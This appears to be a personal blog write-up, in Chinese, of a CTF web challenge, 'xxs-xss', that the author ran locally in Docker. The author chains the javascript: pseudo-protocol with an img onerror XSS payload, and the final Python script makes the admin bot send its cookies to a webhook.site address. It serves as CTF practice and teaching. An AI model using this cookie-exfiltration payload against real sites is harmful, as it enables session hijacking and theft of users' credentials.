---
date: '2025-09-08T12:44:13+08:00'
draft: false
title: 'CTF_xxs-xss'
tags: [ "CTF", "web", "Docker"]
---
# xxs-xss

> 人生第一題破解出來的 xss，祖墳冒煙啦

這是2025 No Hack No CTF 的 web 題目，拿來自己練習，花了一個多禮拜QQ

<!--more-->

## Description

用 Docker 架起來後連線到 http://localhost:21337/

頁面顯示如下

![xxs-xss-guest](/images/post-images/xxs-xss-guest.png)

hmmm，甚麼都沒有

## Solution

根據題目給的 source code，先去觀察 `app.py`

<details open><summary>app.py 程式碼</summary>

```py =
from flask import Flask, request, jsonify, abort, redirect, session, render_template, make_response
import subprocess
import threading
import hashlib
import os
import time

app = Flask(__name__)
app.secret_key = os.urandom(16)

FLAG = 'NHNC{FAKE_FLAG}' 

def terminate_process(process):
    process.terminate()
    print("Process terminated after 20 seconds.")

@app.route('/get_challenge', methods=['GET'])
def get_challenge():
    challenge = os.urandom(8).hex()
    session['challenge'] = challenge
    session['ts'] = time.time()
    return jsonify({
        "challenge": challenge,
        "description": "Find a nonce such that SHA256(challenge + nonce) starts with 000000"
    })

@app.route('/visit', methods=['GET'])
def visit():
    url = request.args.get('url')
    nonce = request.args.get('nonce')

    if not url or not nonce:
        return "Missing url or nonce", 400

    if not url.startswith('http://localhost:5000/'):
        return "Bad Hacker", 400

    challenge = session.get('challenge')
    ts = session.get('ts')

    if not challenge or not ts:
        return "No challenge in session. Please request /get_challenge first.", 400

    if time.time() - ts > 60:
        session.pop('challenge', None)
        session.pop('ts', None)
        return "Challenge expired. Please request a new one.", 400

    h = hashlib.sha256((challenge + nonce).encode()).hexdigest()
    if not h.startswith("000000"):
        return "Invalid PoW", 400

    # No reuse of PoW
    session.pop('challenge', None)
    session.pop('ts', None)

    process = subprocess.Popen(['chromium', url, '--headless', '--disable-gpu', '--no-sandbox'],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    timer = threading.Timer(20, terminate_process, [process])
    timer.start()
    return "Admin is visiting your page!"

@app.route('/', methods=['GET'])
def main():
    if request.remote_addr == '127.0.0.1':
        resp = make_response(render_template('index.html'))
        resp.set_cookie('flag', FLAG)
        return resp
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```
</details>

說明一下 `app.py` 整體流程:

1. 首先要去 `/get_challenge` 拿隨機字串 challenge
2. 爆破解出符合條件的 nonce (用題目給的 solve_pow.py)
3. 透過訪問 `/visit` 取得兩個參數 : url 和 nonce
4. 檢查條件 :
    1. 如果沒有 url 或是 nonce 參數，返回: `Missing url or nonce`
    2. 如果 url 不是以 `http://localhost:5000/` 開頭，返回 : `Bad Hacker`
    3. 如果使用者的 session 有沒有 challenge 或 ts(時間戳)，返回 : `No challenge in session. Please request /get_challenge first.`
    4. challenge 的有效時間只有 60 秒，若超時則返回 : `challenge expired. Please request a new one.`
    5. (challenge + nonce) 的 SHA256 雜湊值如果不是以 `000000` 開頭，返回 : `Invalid PoW`
5. 啟動一個 Chromium 瀏覽器，訪問指定的 url，並且只執行 20 秒，時間到就關閉
6. 如果是用 Bot 訪問瀏覽器打開 url，就渲染 `index.html` 這個網頁，並把 flag 設在 cookie 裡面

再來看一下 `index.html` 做了甚麼

<details open> <summary>index.html 程式碼</summary>

```js =
<script>

    function getQueryParam(key) {
      const params = new URLSearchParams(window.location.search);
      return params.get(key) || '';
    }

    const name = getQueryParam('name');
    const targetUrl = getQueryParam('url');

    const display = document.getElementById('displayName');
    display.textContent = name || 'Guest';

    setTimeout(() => {
      if (targetUrl && targetUrl.length<=15) {
        window.location.href = targetUrl;
      }
    }, 3000);

    
  </script>
```

</details>

以上是他的 JS 部分，一樣說明一下做了甚麼

1. name 的部分採用 textContent -> 任何的程式碼都會變成純文字
    1. 例如 : `?name=<script>alert(1)</script>` 也不會執行
2. targetUrl 的值是從 url 來的，但長度需要不大於15，會在 3 秒後觸發 redirect
---
好了，知道整個頁面怎麼運作了，剩下就是如何打出 xss

在 [在做跳轉功能時應該注意的問題：Open Redirect](https://blog.huli.tw/2021/09/26/what-is-open-redirect/) 這篇文章中看到一個重點 :

![xxs-xss-redirection](/images/post-images/xxs-xss-redirection.png)


在 `index.html` 程式碼的第四行 : 
`const params = new URLSearchParams(window.location.search);`

#### 建構 payload 點-1
- 有沒有可能改變 `window.location` 的值，讓他連上外網傳送 cookie?

接著在 [xss-payload-list](https://github.com/payloadbox/xss-payload-list) 裡面看到一個可能有用的 payload :`<img src =q onerror=prompt(8)>`

#### 建構 payload 點-2
- 把 oneerror 後面那串改成我們的外網連結並加上 document.cookie

**但是要怎麼觸發 oneerror?**

[javascript 偽協議](https://aszx87410.github.io/beyond-xss/ch1/javascript-protocol/#%E4%BB%80%E9%BA%BC%E6%98%AF-javascript-%E5%81%BD%E5%8D%94%E8%AD%B0) 這篇文章給了我答案

#### 建構 payload 點-3
- url 要以 `http://localhost:5000/` 開頭，並且加上 `url=javascript:name`，其中 name 的值就是 oneerror 那段程式碼

#### 開始嘗試 payload

first_payload =
`<img src=x onerror='location.href=\"{WEBHOOK}/?flag=\"+btoa(document.cookie)'>&url=http://localhost:5000/?url=javascript:name`

將這個 payload 透過腳本串接，結果如下圖 : 
![xxs-xss-payload-1](/images/post-images/xxs-xss-payload-1.png)

欸可是?沒連到外網?

去看了 container 的 config :
![xxs-xss-config-1](/images/post-images/xxs-xss-config-1.png)


在這裡卡很久，一直覺得 url 長度剛好 15 沒超過，為甚麼沒有觸發到 name 的部分?? 

於是開始了排列組合遊戲 (好玩愛玩下次不玩了QQ)

second_payload = 
`url=http://localhost:5000/?url=javascript:name&name=<img src=x onerror='location.href=\"{WEBHOOK}/?flag=\"+btoa(document.cookie)'>`

在經過腳本串接後，得到一樣的回應 和 config : 
![xxs-xss-payload-2](/images/post-images/xxs-xss-payload-2.png)
![xxs-xss-config-2](/images/post-images/xxs-xss-config-2.png)


還是沒連到外網

在這裡卡了好多天，程式碼看到睡覺還會夢到，超可怕

最後有幸得到高人指點迷津 : 

![xxs-xss-hint](/images/post-images/xxs-xss-hint.png)

~~很明顯我的排列組合遊戲根本沒有好好玩過一遍~~

再看一次程式碼，尤其是 `app.py` 的`visit()` 函式

```py =
def visit():
    url = request.args.get('url')
    nonce = request.args.get('nonce')
```

<div class="info-box">
<strong>

簡單來說，/visit 只有兩個 query string : url 和 nonce，而 name 不會，~~就算 name 再好看他都視而不見~~。

前面兩個 payload Bot 訪問的都是 `/?url=javasceript:name`，name 的值沒有被 url 帶進去，所以是空的，就算跳轉到 `javascript:name` 也不會執行

所以要讓 url 帶進去的參數有 name 的值，一開始就要讓 url 帶上 name，再接 `&url=javasceipt:name&nonce={}`，`request.args.get("url")` 會把整段 url 的參數讓 Bot 去訪問，這樣跳轉到 `javascript:name` 才有意義
</strong>
</div>

<details open> <summary>最終 script</summary>

```py
import requests
import hashlib
import urllib.parse

BASE = "http://localhost:21337"   
WEBHOOK = "https://webhook.site/422cda5d-b5d7-4998-8046-fdd591edc79b"

def solve_pow(challenge, prefix="000000"):
    for i in range(10000000000): 
        nonce = str(i)
        h = hashlib.sha256((challenge + nonce).encode()).hexdigest()
        if h.startswith(prefix):
            return nonce
    return None

def main():
    s = requests.Session()

    # 1. 拿 PoW challenge
    r = s.get(f"{BASE}/get_challenge")
    j = r.json()
    challenge = j["challenge"]
    print(f"[+] Challenge: {challenge}")

    # 2. 解 PoW
    nonce = solve_pow(challenge)
    if not nonce:
        print("[-] Failed to solve PoW")
        return
    print(f"[+] Nonce: {nonce}")

    # 3. 構造 payload
    
    encode_payload = urllib.parse.quote(f"<img src=x onerror='location.href=\"{WEBHOOK}/?flag=\"+btoa(document.cookie)'>")
    
    test_payload = f"http://localhost:5000/?name={encode_payload}&url=javascript:name"

    encode_test_payload = urllib.parse.quote(test_payload)

    exploit_url = f"{BASE}/visit?url={encode_test_payload}&nonce={nonce}"

    print(f"[+] Exploit URL:\n{exploit_url}")

    # 4. 發送請求（保持同一個 session）
    r2 = s.get(exploit_url)
    print("[+] Response:", r2.text)

if __name__ == "__main__":
    main()
```
</details>

![xxs-xss-config-3](/images/post-images/xxs-xss-config-3.png)


成功訪問外網啦(歡呼~)

去外網找 flag 

![xxs-xss-webhook](/images/post-images/xxs-xss-webhook.png)

得到一串 base64，解碼就得到 flag 了

最終訪問的 payload : 
`url=http%3A//localhost%3A5000/%3Fname%3D%253Cimg%2520src%253Dx%2520onerror%253D%2527location.href%253D%2522{WEBHOOK}/%253Fflag%253D%2522%252Bbtoa%2528document.cookie%2529%2527%253E%26url%3Djavascript%3Aname&nonce=18235395`

<div class="warning-box">
<strong>

整個過程原理就是 : 

javascript 偽協議會先執行變數的內容，觸發 oneerror，接著才會渲染頁面(index.html)

這是 javascript 偽協議特有的特性

最後總結一下之前卡住的原因 : 

1. 一直覺得 url 的長度不能超過15，所以 `/?url=javascript:name`，是唯一解
2. 但其實至少要讓網站可以讀到 name 的值，就算有 textContent 也沒關係，因為 javascript 偽協議會先執行

</strong>
</div>


## Flag

<div class="flag-box">
<strong>
flag : NHNC{FAKE_FLAG}
</strong>
</div>